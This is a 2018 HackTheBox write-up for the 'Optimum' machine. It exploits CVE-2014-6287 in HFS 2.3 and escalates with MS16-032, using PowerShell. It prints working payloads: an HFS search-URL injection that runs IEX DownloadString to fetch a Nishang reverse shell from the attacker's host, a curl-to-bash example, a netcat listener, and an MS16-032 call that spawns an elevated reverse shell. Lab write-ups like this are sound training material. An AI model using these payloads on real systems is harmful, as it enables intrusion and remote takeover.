---
title: HackTheBox - Optimum (ft. PowerShell)
category: infosec
date: 2018-09-19
thumbnail: optimum-thumb.png
tags: htb,powershell
description:
---

Optimum was a fun box with which while the write-up says to use Metasploit, can be done almost entirely with PowerShell. This makes it good practice for someone like me who has never used PowerShell to learn some basic things.

![image-alternative](/common/static/img/optimum-nmap.png)

Our initial nmap scans only show one port open running HttpFileServer (HFS) version 2.3, which is vulnerable to [CVE-2014-6287](https://www.cvedetails.com/cve/CVE-2014-6287/). From the description it *"allows remote attackers to execute arbitrary programs via a %00 sequence in a search action."* Basically this just allows us to execute HFS template macros by just sending a null byte (%00) to the search item. Metasploit has the module **exploit/windows/http/rejetto_hfs_exec** to exploit this vulnerability and get a meterpreter shell, but to get a reverse shell in PowerShell, we are going to do it manually.

Using [this reference guide](http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands), we can see that the command we want is `{.exec | A.}`, where `A` is the file to run. In order to get a reverse shell, our script will want to look something like: `{exec | powershell.exe ReverseShell.ps1}`, which will run the "ReverseShell.ps1" script in PowerShell. The reverse shell script we will be using comes from [Nishang](https://github.com/samratashok/nishang), which is a collection of PowerShell scripts used for pen testing. Specifically we want to use [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Download it and add this line to the bottom of the file to make the `Invoke-PowerShellTcp` function run when the script is executed without any arguments:

    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 4444

Our IP address is `10.10.14.3` and we want to listen on port `4444`. In order to get this script into the target machine, we will setup our own HTTP server from where the file can be downloaded from. This can be done using a basic Python module form the command line:

    # Make sure you are in the same directory as the reverse shell script
    $ python -m SimpleHTTPServer # for Python 2
    $ python -m http.server # for Python 3

This will setup a HTTP server which we can access from our IP address `(10.10.14.3)` on port `8000` (by default). Okay, so now we need a way to cause our target machine to download and run this script. On a Linux box with Bash this would be a simple:

    curl http://10.10.14.3:8000/ReverseShell.sh | bash

But on PowerShell it looks a bit different:

    IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')

Because this isn't intended to be a tutorial on PowerShell (I intend to do that later), for now I'll just say that this command is almost identical in what it does to the curl command above. That is - it downloads the reverse shell script and then runs it.

Now is finally time to do the exploit. We will open up netcat as our listener on port 4444 with "nc -lvnp 4444" and paste this into the search URL:

    /?search=%00{.exec|C%3a\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+System.Net.WebClient).DownloadString('http%3a//10.10.14.4%3a8000/Invoke-PowerShellTcp.ps1').}  Without URL encoding it should look like this:

    /?search=%00{.exec|C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object+System.Net.WebClient).DownloadString('http://10.10.14.4:8000/Invoke-PowerShellTcp.ps1').}

You can see at the start we use the null terminator (%00) then execute our command from `powershell.exe` located in `C:\Windows\SysNative\WindowsPowershell\v1.0\` which is the 64bit version of PowerShell.

![image-alternative](/common/static/img/optimum-ncat.png)

We can now get `user.txt` from the current directory.

Normally to get root with Metasploit you could use **local\_exploit\_suggester**. But we will use [Sherlock](https://github.com/rasta-mouse/Sherlock), which is a script to find missing software patches for privesc. Download it and add this line to the bottom of the script:

    Find-AllVulns

Now we will invoke it from our shell with:

    IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:8000/Sherlock.ps1')

This will go through every vulnerability, but the one we are interested in is this (MS16-032):

![image-alternative](/common/static/img/optimum-sherlock.png)

`MS16-032` is a vulnerability could allow elevation of privilege if the Windows Secondary Logon Service fails to properly manage request handles in memory.

In order to exploit this vulnerability we will use [this script](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1) form the Empire exploitation framework for PowerShell. As usual add this line at the bottom to run the function when it is downloaded.

    Invoke-MS16032 -Command "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.4:8000/Invoke-PowerShellTcp-MS16032.ps1')"

As you can see we are creating another reverse shell, but because of the `MS16-032` exploit, we will run it as root. Also note that you can't use the same port that your current shell is using, so you will have to create another script and netcat instance with a different port. I will be using port `4448`.

Now we run the command from our shell to get the script:

    IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-MS16032.ps1')

![image-alternative](/common/static/img/optimum-root.png)

And now we are root. The flag is in `C:\Users\Administrator\Desktop\root.txt`.
